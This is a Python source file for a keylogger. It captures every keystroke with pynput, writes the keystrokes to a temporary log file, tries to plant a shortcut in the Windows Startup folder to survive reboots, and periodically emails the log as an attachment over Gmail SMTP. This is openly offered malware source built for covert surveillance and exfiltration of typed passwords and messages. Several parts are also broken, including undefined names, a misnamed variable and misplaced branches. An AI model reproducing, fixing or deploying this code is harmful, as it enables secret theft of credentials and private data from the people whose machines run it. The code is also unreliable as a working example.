#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Sep 17 21:51:34 2019

@author: neal
"""

from temp import *

from pynput.keyboard import Key, Listener
import os
import shutil
import datetime
import winshell
# from win32con.client import Dispatch
import tempfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import threading
import socket
from gui_func import *

#calling the functiions from the gui_func script
gui()
save3_var()

# temporary folder to store the txt file when offline



save = tempfile.mkdtemp("screen")
print(save)
cwd = os.getcwd()
source = os.listdir()

dateAndtime = datetime.datetime.now().strftime("-%Y-%m-%d-%H-%M-%S")

filename = save + "key_log" + dateAndtime + ".txt"
open(filename, "w+")
keys = []
count = 0
countInternet = 0
word = "Key."

username = os.getlogin()#gets the users /desktop Name

destination = r'C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startuplogger'.format(username)#saves the txt in the given location
#assigning sender_email and password_get the input from the users entry
Sender_email = save3_var.var1
Receiver_email = Sender_email
password_get =save3_var.var2

#Creating a shortcut.........Not sure if its working
def main():
    path = os.path.join(destination, "keylogger.pwy - shortcut.lnk")

    target =r"" + cwd + "keylogger.pyw"
    for files in source:
        if files == "keylogger.pyw":
            shell = Dispatch('WScript.shell')
            shortcut = shell.CreateShortCut(path)
            shortcut.Targetpath = target
            shortcut.IconLocation = icon
            shortcut.save()


shortcut = 'keylogger.pyw - Shortcut.lnk'

if shortcut in destination:
    pass
else:
    main()


# internet connection func ..connects to gmail
def is_connected():
    try:
        socket.create_connection(("www.google.com", 80))
        return True
    except OSError:
        pass
    return False


# func to send email
gui_func()

def send_email():

    fromaddr = sender_email
    toaddr = Receiver_email
    subject="hello fom keylloger.py"

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr
    msg['Subject'] =subject
    body = "Key INPUTS are:"
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    #     encode into base64
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= " +filename)
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr,password_get)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

# the function that reads the keystroke ,create a txt file and saves them in the txt file
def write_file(keys):
    with open(filename, "a")as f:
        for key in keys:

            if key == 'Key.enter':
                f.write("\n")
            elif key == 'Key.space':
                f.write(key.replace("Key.space", " "))
            elif key[:4] == word:
                pass
            else:
                f.write(key.replace("'", ""))

#function that gets the keystrokes....and checks if internet connection is up or down
def on_press(key):
    global keys, count, countInternet, filename

    keys.append(str(key))

    if len(keys) > 10:
        write_file(keys)

    if is_connected():
        count += 1
        print('connected {}'.format(count))
        if count > 100:
            count = 0

            t1 = threading.Thread(target=send_email, name='t1')
            t1.start()

        else:
            countInternet += 1
            print("Not connected", countInternet)

            if countInternet > 10:
                countInternet = 0

                filename = filename.strip(save)
                for files in save:
                    if files == filename:
                        shutil.copy(files + "t", source)
        # Key.clear()

#listener
with Listener(on_press=on_press)as listener:
    listener.join()









